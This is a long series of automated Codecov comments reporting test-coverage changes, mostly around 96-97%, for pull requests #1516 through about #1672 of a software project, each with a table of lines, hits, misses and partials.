#1516 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1516   diff @@\n==========================================\n  Files            87         87          \n  Lines         10507      10537    +30   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1797       1797          \n==========================================\n+ Hits          10195      10225    +30   \n  Misses          183        183          \n  Partials        129        129\n\nPowered by Codecov. Last update 7acab64...76e6f1d\n. ## Current coverage is 97.03% (diff: 100%)\nMerging #1517 into master will not change coverage\n\ndiff\n@@             master      #1517   diff @@\n==========================================\n  Files            87         87          \n  Lines         10537      10537          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1797       1797          \n==========================================\n  Hits          10225      10225          \n  Misses          183        183          \n  Partials        129        129\n\nPowered by Codecov. Last update 1309a23...d3b8181\n. ## Current coverage is 97.04% (diff: 83.33%)\nMerging #1518 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1518   diff @@\n==========================================\n  Files            87         87          \n  Lines         10537      10541     +4   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1797       1798     +1   \n==========================================\n+ Hits          10225      10229     +4   \n  Misses          183        183          \n  Partials        129        129\n\nPowered by Codecov. Last update 2855d0e...1dd090a\n. ## Current coverage is 97.03% (diff: 100%)\nMerging #1520 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1520   diff @@\n==========================================\n  Files            87         87          \n  Lines         10541      10541          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1798       1798          \n==========================================\n- Hits          10229      10228     -1   \n  Misses          183        183          \n- Partials        129        130     +1\n\nPowered by Codecov. Last update 252964c...5f6827f\n. ## Current coverage is 96.48% (diff: 95.58%)\nMerging #1522 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1522   diff @@\n==========================================\n  Files            89         89          \n  Lines         10878      10940    +62   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1832       1850    +18   \n==========================================\n+ Hits          10495      10556    +61   \n+ Misses          241        240     -1   \n- Partials        142        144     +2\n\nPowered by Codecov. Last update 52a43bd...4e5ca8b\n. ## Current coverage is 97.00% (diff: 80.00%)\nMerging #1525 into master will decrease coverage by 0.03%\n\ndiff\n@@             master      #1525   diff @@\n==========================================\n  Files            87         87          \n  Lines         10541      10567    +26   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1798       1804     +6   \n==========================================\n+ Hits          10228      10250    +22   \n- Misses          183        188     +5   \n+ Partials        130        129     -1\n\nPowered by Codecov. Last update 8360a92...5eceb0f\n. ## Current coverage is 97.03% (diff: 100%)\nMerging #1526 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1526   diff @@\n==========================================\n  Files            87         87          \n  Lines         10541      10545     +4   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1798       1799     +1   \n==========================================\n+ Hits          10229      10232     +3   \n  Misses          183        183          \n- Partials        129        130     +1\n\nPowered by Codecov. Last update 252964c...fddef79\n. ## Current coverage is 96.98% (diff: 92.30%)\nMerging #1533 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1533   diff @@\n==========================================\n  Files            88         88          \n  Lines         10638      10640     +2   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1814       1814          \n==========================================\n+ Hits          10316      10319     +3   \n+ Misses          179        178     -1   \n  Partials        143        143\n\nPowered by Codecov. Last update 9311fee...8332040\n. ## Current coverage is 96.99% (diff: 100%)\nMerging #1541 into master will not change coverage\n\ndiff\n@@             master      #1541   diff @@\n==========================================\n  Files            88         88          \n  Lines         10640      10640          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1814       1814          \n==========================================\n  Hits          10320      10320          \n  Misses          178        178          \n  Partials        142        142\n\nPowered by Codecov. Last update 0e870ab...ce427b7\n. ## Current coverage is 96.97% (diff: 100%)\nMerging #1547 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1547   diff @@\n==========================================\n  Files            88         88          \n  Lines         10641      10640     -1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1814       1813     -1   \n==========================================\n- Hits          10320      10318     -2   \n  Misses          179        179          \n- Partials        142        143     +1\n\nPowered by Codecov. Last update 16f2931...530b15a\n. ## Current coverage is 96.99% (diff: 100%)\nMerging #1550 into master will not change coverage\n\ndiff\n@@             master      #1550   diff @@\n==========================================\n  Files            88         88          \n  Lines         10640      10640          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1814       1814          \n==========================================\n  Hits          10320      10320          \n  Misses          178        178          \n  Partials        142        142\n\nPowered by Codecov. Last update b13ee9c...ae757c2\n. ## Current coverage is 96.98% (diff: 98.55%)\nMerging #1552 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1552   diff @@\n==========================================\n  Files            88         88          \n  Lines         10640      10641     +1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1814       1814          \n==========================================\n  Hits          10320      10320          \n- Misses          178        179     +1   \n  Partials        142        142\n\nPowered by Codecov. Last update b13ee9c...5835159\n. ## Current coverage is 96.97% (diff: 98.55%)\nMerging #1553 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1553   diff @@\n==========================================\n  Files            88         88          \n  Lines         10640      10641     +1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1814       1814          \n==========================================\n- Hits          10320      10319     -1   \n- Misses          178        179     +1   \n- Partials        142        143     +1\n\nPowered by Codecov. Last update b13ee9c...633e447\n. ## Current coverage is 96.44% (diff: 95.22%)\nMerging #1557 into master will decrease coverage by 0.04%\n\ndiff\n@@             master      #1557   diff @@\n==========================================\n  Files            89         98     +9   \n  Lines         10940      11100   +160   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1850       1884    +34   \n==========================================\n+ Hits          10556      10705   +149   \n- Misses          240        242     +2   \n- Partials        144        153     +9\n\nPowered by Codecov. Last update 120f85f...6b4dc86\n. ## Current coverage is 96.97% (diff: 100%)\nMerging #1558 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1558   diff @@\n==========================================\n  Files            88         88          \n  Lines         10641      10641          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1814       1814          \n==========================================\n- Hits          10320      10319     -1   \n  Misses          179        179          \n- Partials        142        143     +1\n\nPowered by Codecov. Last update 16f2931...8c17462\n. ## Current coverage is 96.74% (diff: 0.00%)\nMerging #1559 into master will decrease coverage by 0.08%\n\ndiff\n@@             master      #1559   diff @@\n==========================================\n  Files            88         88          \n  Lines         10677      10667    -10   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1820       1820          \n==========================================\n- Hits          10339      10320    -19   \n- Misses          194        202     +8   \n- Partials        144        145     +1\n\nPowered by Codecov. Last update 2d14585...1a68cf3\n. ## Current coverage is 96.98% (diff: 100%)\nMerging #1560 into master will not change coverage\n\ndiff\n@@             master      #1560   diff @@\n==========================================\n  Files            88         88          \n  Lines         10640      10640          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1813       1813          \n==========================================\n  Hits          10319      10319          \n  Misses          179        179          \n  Partials        142        142\n\nPowered by Codecov. Last update 7d901ff...5e04e2b\n. ## Current coverage is 96.97% (diff: 100%)\nMerging #1561 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1561   diff @@\n==========================================\n  Files            88         88          \n  Lines         10640      10640          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1813       1813          \n==========================================\n- Hits          10319      10318     -1   \n  Misses          179        179          \n- Partials        142        143     +1\n\nPowered by Codecov. Last update 7d901ff...491a60c\n. ## Current coverage is 96.97% (diff: 100%)\nMerging #1562 into master will not change coverage\n\ndiff\n@@             master      #1562   diff @@\n==========================================\n  Files            88         88          \n  Lines         10640      10640          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1813       1813          \n==========================================\n  Hits          10318      10318          \n  Misses          179        179          \n  Partials        143        143\n\nPowered by Codecov. Last update 9ce8cfd...46f1bc8\n. ## Current coverage is 97.03% (diff: 100%)\nMerging #1563 into master will not change coverage\n\ndiff\n@@             master      #1563   diff @@\n==========================================\n  Files            87         87          \n  Lines         11191      11191          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n  Hits          10859      10859          \n  Misses          210        210          \n  Partials        122        122\n\nPowered by Codecov. Last update d8f98bc...4cc32eb. ## Current coverage is 96.45% (diff: 100%)\nMerging #1564 into master will decrease coverage by 0.29%\n\ndiff\n@@             master      #1564   diff @@\n==========================================\n  Files            88         89     +1   \n  Lines         10667      10699    +32   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1820       1822     +2   \n==========================================\n- Hits          10321      10320     -1   \n- Misses          202        234    +32   \n- Partials        144        145     +1\n\nPowered by Codecov. Last update 966ee43...a73924e\n. ## Current coverage is 96.83% (diff: 62.22%)\nMerging #1566 into master will decrease coverage by 0.16%\n\ndiff\n@@             master      #1566   diff @@\n==========================================\n  Files            88         88          \n  Lines         10640      10670    +30   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1813       1818     +5   \n==========================================\n+ Hits          10320      10332    +12   \n- Misses          178        194    +16   \n- Partials        142        144     +2\n\nPowered by Codecov. Last update b5a2a85...6ac53ea\n. ## Current coverage is 96.14% (diff: 90.90%)\nMerging #1570 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1570   diff @@\n==========================================\n  Files            89         90     +1   \n  Lines         10862      10849    -13   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1826       1821     -5   \n==========================================\n- Hits          10445      10431    -14   \n- Misses          274        275     +1   \n  Partials        143        143\n\nPowered by Codecov. Last update 64e9abe...760c535\n. ## Current coverage is 96.98% (diff: 100%)\nMerging #1571 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1571   diff @@\n==========================================\n  Files            88         88          \n  Lines         10642      10642          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1813       1813          \n==========================================\n+ Hits          10320      10321     +1   \n  Misses          179        179          \n+ Partials        143        142     -1\n\nPowered by Codecov. Last update 63e7872...3b8171e\n. ## Current coverage is 96.84% (diff: 100%)\nMerging #1572 into master will decrease coverage by 0.13%\n\ndiff\n@@             master      #1572   diff @@\n==========================================\n  Files            88         88          \n  Lines         10642      10677    +35   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1813       1818     +5   \n==========================================\n+ Hits          10320      10340    +20   \n- Misses          179        194    +15   \n  Partials        143        143\n\nPowered by Codecov. Last update 63e7872...5ab1846\n. ## Current coverage is 96.84% (diff: 100%)\nMerging #1574 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1574   diff @@\n==========================================\n  Files            88         88          \n  Lines         10670      10675     +5   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1818       1818          \n==========================================\n+ Hits          10332      10338     +6   \n  Misses          194        194          \n+ Partials        144        143     -1\n\nPowered by Codecov. Last update 49eccfc...b7812f3\n. ## Current coverage is 96.84% (diff: 100%)\nMerging #1575 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1575   diff @@\n==========================================\n  Files            88         88          \n  Lines         10670      10670          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1818       1818          \n==========================================\n+ Hits          10332      10333     +1   \n  Misses          194        194          \n+ Partials        144        143     -1\n\nPowered by Codecov. Last update 49eccfc...fe7237d\n. ## Current coverage is 96.83% (diff: 100%)\nMerging #1576 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1576   diff @@\n==========================================\n  Files            88         88          \n  Lines         10670      10669     -1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1818       1818          \n==========================================\n- Hits          10332      10331     -1   \n  Misses          194        194          \n  Partials        144        144\n\nPowered by Codecov. Last update bdf6995...96df644\n. ## Current coverage is 96.84% (diff: 100%)\nMerging #1577 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1577   diff @@\n==========================================\n  Files            88         88          \n  Lines         10677      10674     -3   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1818       1818          \n==========================================\n- Hits          10339      10337     -2   \n  Misses          194        194          \n+ Partials        144        143     -1\n\nPowered by Codecov. Last update 5a48c11...743cb07\n. ## Current coverage is 96.84% (diff: 100%)\nMerging #1578 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1578   diff @@\n==========================================\n  Files            88         88          \n  Lines         10677      10677          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1818       1818          \n==========================================\n+ Hits          10339      10340     +1   \n  Misses          194        194          \n+ Partials        144        143     -1\n\nPowered by Codecov. Last update f9151de...f4f4949\n. ## Current coverage is 96.83% (diff: 100%)\nMerging #1580 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1580   diff @@\n==========================================\n  Files            88         88          \n  Lines         10677      10675     -2   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1818       1818          \n==========================================\n- Hits          10339      10337     -2   \n  Misses          194        194          \n  Partials        144        144\n\nPowered by Codecov. Last update 5a48c11...cabf0a6\n. ## Current coverage is 96.84% (diff: 80.00%)\nNo coverage report found for master at 8d1398c.\nPowered by Codecov. Last update 8d1398c...b7a7be9\n. ## Current coverage is 96.74% (diff: 100%)\nMerging #1590 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1590   diff @@\n==========================================\n  Files            88         88          \n  Lines         10667      10667          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1820       1820          \n==========================================\n- Hits          10321      10320     -1   \n  Misses          202        202          \n- Partials        144        145     +1\n\nPowered by Codecov. Last update d2b0783...d2fc4a8\n. ## Current coverage is 96.92% (diff: 92.85%)\nMerging #1591 into master will increase coverage by 0.17%\n\ndiff\n@@             master      #1591   diff @@\n==========================================\n  Files            88         88           \n  Lines         10667      13446   +2779   \n  Methods           0          0           \n  Messages          0          0           \n  Branches       1820       2560    +740   \n==========================================\n+ Hits          10321      13033   +2712   \n- Misses          202        257     +55   \n- Partials        144        156     +12\n\nPowered by Codecov. Last update 966ee43...c027db4\n. ## Current coverage is 96.75% (diff: 100%)\nMerging #1595 into master will not change coverage\n\ndiff\n@@             master      #1595   diff @@\n==========================================\n  Files            88         88          \n  Lines         10667      10667          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1820       1820          \n==========================================\n  Hits          10321      10321          \n  Misses          202        202          \n  Partials        144        144\n\nPowered by Codecov. Last update 966ee43...6863cff\n. ## Current coverage is 96.70% (diff: 0.00%)\nMerging #1596 into master will decrease coverage by 0.05%\n\ndiff\n@@             master      #1596   diff @@\n==========================================\n  Files            88         88          \n  Lines         10667      10672     +5   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1820       1821     +1   \n==========================================\n- Hits          10321      10320     -1   \n- Misses          202        207     +5   \n- Partials        144        145     +1\n\nPowered by Codecov. Last update 8eefd52...b67699a\n. ## Current coverage is 96.34% (diff: 100%)\nMerging #1598 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1598   diff @@\n==========================================\n  Files            88         88          \n  Lines         10672      10672          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1821       1821          \n==========================================\n- Hits          10283      10282     -1   \n  Misses          245        245          \n- Partials        144        145     +1\n\nPowered by Codecov. Last update cbf0ed7...9d5ac62\n. ## Current coverage is 96.37% (diff: 100%)\nMerging #1601 into master will increase coverage by 0.02%\n\ndiff\n@@             master      #1601   diff @@\n==========================================\n  Files            88         88          \n  Lines         10672      10689    +17   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1821       1824     +3   \n==========================================\n+ Hits          10282      10301    +19   \n  Misses          245        245          \n+ Partials        145        143     -2\n\nPowered by Codecov. Last update abcde8d...7d7712e\n. ## Current coverage is 96.36% (diff: 100%)\nMerging #1603 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1603   diff @@\n==========================================\n  Files            88         88          \n  Lines         10689      10690     +1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1824       1824          \n==========================================\n  Hits          10301      10301          \n  Misses          245        245          \n- Partials        143        144     +1\n\nPowered by Codecov. Last update c18ab43...0897801\n. ## Current coverage is 96.36% (diff: 100%)\nMerging #1604 into master will not change coverage\n\ndiff\n@@             master      #1604   diff @@\n==========================================\n  Files            88         88          \n  Lines         10690      10690          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1824       1824          \n==========================================\n  Hits          10301      10301          \n  Misses          245        245          \n  Partials        144        144\n\nPowered by Codecov. Last update f2e2172...74fc9ae\n. ## Current coverage is 97.06% (diff: 100%)\nMerging #1605 into master will not change coverage\n\ndiff\n@@             master      #1605   diff @@\n==========================================\n  Files            89         89          \n  Lines         11247      11247          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1888       1888          \n==========================================\n  Hits          10917      10917          \n  Misses          187        187          \n  Partials        143        143\n\nPowered by Codecov. Last update ee2f094...5c9abad\n. ## Current coverage is 96.14% (diff: 100%)\nMerging #1609 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1609   diff @@\n==========================================\n  Files            89         89          \n  Lines         10852      10852          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1826       1826          \n==========================================\n- Hits          10435      10434     -1   \n  Misses          274        274          \n- Partials        143        144     +1\n\nPowered by Codecov. Last update c4f4616...c982e78\n. ## Current coverage is 96.15% (diff: 100%)\nMerging #1611 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1611   diff @@\n==========================================\n  Files            89         89          \n  Lines         10852      10852          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1826       1826          \n==========================================\n- Hits          10437      10435     -2   \n- Misses          273        274     +1   \n- Partials        142        143     +1\n\nPowered by Codecov. Last update c6046d9...d096bf7\n. ## Current coverage is 96.16% (diff: 100%)\nMerging #1613 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1613   diff @@\n==========================================\n  Files            89         89          \n  Lines         10861      10862     +1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1826       1826          \n==========================================\n+ Hits          10444      10445     +1   \n  Misses          274        274          \n  Partials        143        143\n\nPowered by Codecov. Last update a1bfa29...131d15c\n. ## Current coverage is 96.17% (diff: 100%)\nMerging #1614 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1614   diff @@\n==========================================\n  Files            89         89          \n  Lines         10862      10862          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1826       1826          \n==========================================\n+ Hits          10445      10447     +2   \n+ Misses          274        273     -1   \n+ Partials        143        142     -1\n\nPowered by Codecov. Last update 3d5daff...c8769ff\n. ## Current coverage is 96.45% (diff: 100%)\nMerging #1616 into master will increase coverage by 0.29%\n\ndiff\n@@             master      #1616   diff @@\n==========================================\n  Files            89         88     -1   \n  Lines         10862      10857     -5   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1826       1828     +2   \n==========================================\n+ Hits          10445      10472    +27   \n+ Misses          274        242    -32   \n  Partials        143        143\n\nPowered by Codecov. Last update 41bb914...d0806d3\n. ## Current coverage is 96.16% (diff: 100%)\nMerging #1617 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1617   diff @@\n==========================================\n  Files            89         89          \n  Lines         10862      10881    +19   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1826       1828     +2   \n==========================================\n+ Hits          10445      10464    +19   \n  Misses          274        274          \n  Partials        143        143\n\nPowered by Codecov. Last update 41bb914...591a10c\n. ## Current coverage is 96.18% (diff: 100%)\nMerging #1619 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1619   diff @@\n==========================================\n  Files            89         89          \n  Lines         10881      10885     +4   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1828       1829     +1   \n==========================================\n+ Hits          10464      10470     +6   \n+ Misses          274        273     -1   \n+ Partials        143        142     -1\n\nPowered by Codecov. Last update b0f4108...2b432fa\n. ## Current coverage is 96.16% (diff: 100%)\nMerging #1620 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1620   diff @@\n==========================================\n  Files            89         89          \n  Lines         10881      10885     +4   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1828       1829     +1   \n==========================================\n+ Hits          10464      10468     +4   \n  Misses          274        274          \n  Partials        143        143\n\nPowered by Codecov. Last update b0f4108...19eda87\n. ## Current coverage is 96.47% (diff: 100%)\nMerging #1621 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1621   diff @@\n==========================================\n  Files            88         88          \n  Lines         10857      10857          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1828       1828          \n==========================================\n+ Hits          10472      10474     +2   \n+ Misses          242        241     -1   \n+ Partials        143        142     -1\n\nPowered by Codecov. Last update b40362a...18f0478\n. ## Current coverage is 96.47% (diff: 100%)\nMerging #1622 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1622   diff @@\n==========================================\n  Files            88         88          \n  Lines         10857      10858     +1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1828       1828          \n==========================================\n+ Hits          10472      10475     +3   \n+ Misses          242        241     -1   \n+ Partials        143        142     -1\n\nPowered by Codecov. Last update b40362a...976ba26\n. ## Current coverage is 96.17% (diff: 100%)\nMerging #1623 into master will not change coverage\n\ndiff\n@@             master      #1623   diff @@\n==========================================\n  Files            89         89          \n  Lines         10889      10889          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1830       1830          \n==========================================\n  Hits          10472      10472          \n  Misses          274        274          \n  Partials        143        143\n\nPowered by Codecov. Last update abe2a28...f01bf6f\n. ## Current coverage is 96.42% (diff: 96.37%)\nMerging #1624 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1624   diff @@\n==========================================\n  Files            89         89          \n  Lines         11123      11286   +163   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1893       1880    -13   \n==========================================\n+ Hits          10726      10883   +157   \n- Misses          243        251     +8   \n+ Partials        154        152     -2\n\nPowered by Codecov. Last update cfb4f0f...e709d78\n. ## Current coverage is 96.47% (diff: 100%)\nMerging #1627 into master will not change coverage\n\ndiff\n@@             master      #1627   diff @@\n==========================================\n  Files            88         88          \n  Lines         10858      10858          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1828       1828          \n==========================================\n  Hits          10475      10475          \n  Misses          241        241          \n  Partials        142        142\n\nPowered by Codecov. Last update 416b971...bc884e4\n. ## Current coverage is 96.47% (diff: 100%)\nMerging #1630 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1630   diff @@\n==========================================\n  Files            88         88          \n  Lines         10858      10864     +6   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1828       1832     +4   \n==========================================\n+ Hits          10475      10481     +6   \n  Misses          241        241          \n  Partials        142        142\n\nPowered by Codecov. Last update 7bcf701...ec17a63\n. ## Current coverage is 96.32% (diff: 26.92%)\nMerging #1631 into master will decrease coverage by 0.15%\n\ndiff\n@@             master      #1631   diff @@\n==========================================\n  Files            88         88          \n  Lines         10864      10883    +19   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1832       1838     +6   \n==========================================\n+ Hits          10481      10483     +2   \n- Misses          241        258    +17   \n  Partials        142        142\n\nPowered by Codecov. Last update caeea54...18fbb02\n. ## Current coverage is 96.47% (diff: 100%)\nMerging #1632 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1632   diff @@\n==========================================\n  Files            88         89     +1   \n  Lines         10864      10878    +14   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1832       1832          \n==========================================\n+ Hits          10481      10495    +14   \n  Misses          241        241          \n  Partials        142        142\n\nPowered by Codecov. Last update caeea54...9d50f74\n. ## Current coverage is 96.48% (diff: 100%)\nMerging #1637 into master will not change coverage\n\ndiff\n@@             master      #1637   diff @@\n==========================================\n  Files            89         89          \n  Lines         10940      10940          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1850       1850          \n==========================================\n  Hits          10556      10556          \n  Misses          240        240          \n  Partials        144        144\n\nPowered by Codecov. Last update 120f85f...16685ca\n. ## Current coverage is 96.48% (diff: 100%)\nMerging #1638 into master will not change coverage\n\ndiff\n@@             master      #1638   diff @@\n==========================================\n  Files            89         89          \n  Lines         10940      10940          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1850       1850          \n==========================================\n  Hits          10556      10556          \n  Misses          240        240          \n  Partials        144        144\n\nPowered by Codecov. Last update 6373249...d22b7bb\n. ## Current coverage is 96.48% (diff: 100%)\nMerging #1642 into master will not change coverage\n\ndiff\n@@             master      #1642   diff @@\n==========================================\n  Files            89         89          \n  Lines         10940      10940          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1850       1850          \n==========================================\n  Hits          10556      10556          \n  Misses          240        240          \n  Partials        144        144\n\nPowered by Codecov. Last update 18afde3...5c9d0d6\n. ## Current coverage is 96.47% (diff: 50.00%)\nMerging #1645 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1645   diff @@\n==========================================\n  Files            89         89          \n  Lines         10940      10944     +4   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1850       1850          \n==========================================\n+ Hits          10556      10558     +2   \n- Misses          240        242     +2   \n  Partials        144        144\n\nPowered by Codecov. Last update 60d08c9...3dc662f\n. ## Current coverage is 96.47% (diff: 93.93%)\nMerging #1646 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1646   diff @@\n==========================================\n  Files            89         89          \n  Lines         10940      10952    +12   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1850       1853     +3   \n==========================================\n+ Hits          10556      10566    +10   \n- Misses          240        241     +1   \n- Partials        144        145     +1\n\nPowered by Codecov. Last update 35f2869...6b6d40e\n. ## Current coverage is 96.48% (diff: 100%)\nMerging #1647 into master will not change coverage\n\ndiff\n@@             master      #1647   diff @@\n==========================================\n  Files            89         89          \n  Lines         10940      10940          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1850       1850          \n==========================================\n  Hits          10556      10556          \n  Misses          240        240          \n  Partials        144        144\n\nPowered by Codecov. Last update 60d08c9...81c18b4\n. ## Current coverage is 96.59% (diff: 96.15%)\nMerging #1650 into master will increase coverage by 0.14%\n\ndiff\n@@             master      #1650   diff @@\n==========================================\n  Files            89         89          \n  Lines         11187      11209    +22   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1881       1874     -7   \n==========================================\n+ Hits          10790      10827    +37   \n+ Misses          243        239     -4   \n+ Partials        154        143    -11\n\nPowered by Codecov. Last update b9f2263...f1e0b12\n. ## Current coverage is 96.43% (diff: 100%)\nMerging #1655 into master will not change coverage\n\ndiff\n@@             master      #1655   diff @@\n==========================================\n  Files            89         89          \n  Lines         11123      11123          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1893       1893          \n==========================================\n  Hits          10726      10726          \n  Misses          243        243          \n  Partials        154        154\n\nPowered by Codecov. Last update cfb4f0f...94e9e1d\n. ## Current coverage is 96.43% (diff: 100%)\nMerging #1657 into master will not change coverage\n\ndiff\n@@             master      #1657   diff @@\n==========================================\n  Files            89         89          \n  Lines         11123      11123          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1893       1893          \n==========================================\n  Hits          10726      10726          \n  Misses          243        243          \n  Partials        154        154\n\nPowered by Codecov. Last update cfb4f0f...6466e98\n. ## Current coverage is 96.43% (diff: 100%)\nMerging #1658 into master will not change coverage\n\ndiff\n@@             master      #1658   diff @@\n==========================================\n  Files            89         89          \n  Lines         11123      11123          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1893       1893          \n==========================================\n  Hits          10726      10726          \n  Misses          243        243          \n  Partials        154        154\n\nPowered by Codecov. Last update 0bbc789...0864032\n. ## Current coverage is 96.43% (diff: 100%)\nMerging #1661 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1661   diff @@\n==========================================\n  Files            89         89          \n  Lines         11123      11123          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1893       1893          \n==========================================\n- Hits          10728      10726     -2   \n- Misses          242        243     +1   \n- Partials        153        154     +1\n\nPowered by Codecov. Last update d6d2d19...a579ff3\n. ## Current coverage is 96.44% (diff: 100%)\nMerging #1664 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1664   diff @@\n==========================================\n  Files            89         89          \n  Lines         11123      11174    +51   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1893       1887     -6   \n==========================================\n+ Hits          10726      10777    +51   \n  Misses          243        243          \n  Partials        154        154\n\nPowered by Codecov. Last update 46d4d49...3392d56\n. ## Current coverage is 96.44% (diff: 100%)\nMerging #1665 into master will not change coverage\n\ndiff\n@@             master      #1665   diff @@\n==========================================\n  Files            89         89          \n  Lines         11174      11174          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1887       1887          \n==========================================\n  Hits          10777      10777          \n  Misses          243        243          \n  Partials        154        154\n\nPowered by Codecov. Last update cda1d94...79a489e\n. ## Current coverage is 96.45% (diff: 94.73%)\nMerging #1667 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1667   diff @@\n==========================================\n  Files            89         89          \n  Lines         11174      11187    +13   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1887       1881     -6   \n==========================================\n+ Hits          10777      10790    +13   \n  Misses          243        243          \n  Partials        154        154\n\nPowered by Codecov. Last update 7e2a7f6...b1054f9\n. ## Current coverage is 96.44% (diff: 75.00%)\nMerging #1669 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1669   diff @@\n==========================================\n  Files            89         89          \n  Lines         11187      11191     +4   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1881       1882     +1   \n==========================================\n+ Hits          10790      10793     +3   \n  Misses          243        243          \n- Partials        154        155     +1\n\nPowered by Codecov. Last update b9f2263...74bc503\n. ## Current coverage is 96.45% (diff: 100%)\nMerging #1671 into master will not change coverage\n\ndiff\n@@             master      #1671   diff @@\n==========================================\n  Files            89         89          \n  Lines         11187      11187          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1881       1881          \n==========================================\n  Hits          10790      10790          \n  Misses          243        243          \n  Partials        154        154\n\nPowered by Codecov. Last update b9f2263...662cdd7\n. ## Current coverage is 96.45% (diff: 100%)\nMerging #1672 